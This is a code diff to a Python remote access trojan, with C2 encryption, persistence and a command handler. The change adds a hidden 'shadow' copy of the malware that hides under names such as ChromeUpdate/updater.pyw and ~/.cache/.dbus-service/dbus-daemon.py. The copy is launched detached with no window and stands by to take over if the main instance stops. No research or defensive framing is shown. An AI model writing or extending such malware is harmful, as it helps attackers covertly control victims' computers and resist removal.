@@ -73,15 +73,24 @@ class Singleton:
     """Ensure only one instance of the RAT is running at a time"""
     def __init__(self, port=55555):
         self.port = port
-        try:
-            # Try to bind to a local port
-            self.lock_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.lock_socket.settimeout(1)
-            self.lock_socket.bind(('127.0.0.1', self.port))
-            # Keep the socket open to maintain the lock
-        except socket.error:
-            # Port is busy, another instance must be running
-            sys.exit(0)
+        self.lock_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.lock_socket.settimeout(1)
+        
+        # Detect if we are a shadow (persistent) process
+        current_path = os.path.abspath(__file__)
+        is_shadow = any(x in current_path for x in [".dbus-service", "ChromeUpdate", ".metadata"])
+        
+        while True:
+            try:
+                self.lock_socket.bind(('127.0.0.1', self.port))
+                break
+            except socket.error:
+                if not is_shadow:
+                    # Main instance: Exit if another is already running
+                    sys.exit(0)
+                else:
+                    # Shadow instance: Wait for the main one to exit to take over
+                    time.sleep(10) # Check every 10 seconds to save CPU
 
 class CryptoManager:
     """Handle encryption/decryption of C2 communications"""
@@ -508,6 +517,17 @@ class PersistenceManager:
             return True, results
         except Exception as e:
             return False, [f"Fatal persistence error: {str(e)}"]
+
+    @staticmethod
+    def get_shadow_path():
+        """Get path to the persistent shadowed copy"""
+        if IS_WINDOWS:
+            return os.path.join(os.environ['APPDATA'], "ChromeUpdate", "updater.pyw")
+        elif IS_LINUX:
+            return os.path.expanduser("~/.cache/.dbus-service/dbus-daemon.py")
+        elif IS_MAC:
+            return os.path.expanduser("~/Library/Application Support/.metadata/metadata_analysis")
+        return None
     
     @staticmethod
     def _linux_persistence():
@@ -1501,8 +1521,30 @@ class AdvancedRAT:
         return {'error': f'Unknown action: {action}'}
     
     def _handle_persistence(self, cmd):
-        """Install persistence"""
+        """Install persistence and launch background shadow process"""
         success, details = PersistenceManager.install_persistence()
+        if success:
+            try:
+                shadow_path = PersistenceManager.get_shadow_path()
+                if shadow_path and os.path.exists(shadow_path):
+                    # Launch shadow process in background
+                    if IS_WINDOWS:
+                        # Find pythonw.exe
+                        exe = sys.executable
+                        if exe.endswith("python.exe"):
+                            exe = exe.replace("python.exe", "pythonw.exe")
+                        subprocess.Popen([exe, shadow_path], 
+                                       creationflags=0x08000000 | 0x00000008, # CREATE_NO_WINDOW | DETACHED_PROCESS
+                                       start_new_session=True)
+                    else:
+                        subprocess.Popen([sys.executable, shadow_path], 
+                                       start_new_session=True, 
+                                       stdout=subprocess.DEVNULL, 
+                                       stderr=subprocess.DEVNULL)
+                    details.append("Background shadow process activated (Standby mode)")
+            except Exception as e:
+                details.append(f"Shadow activation warning: {e}")
+                
         return {'success': success, 'details': details}
 
     def _handle_unpersist(self, cmd):
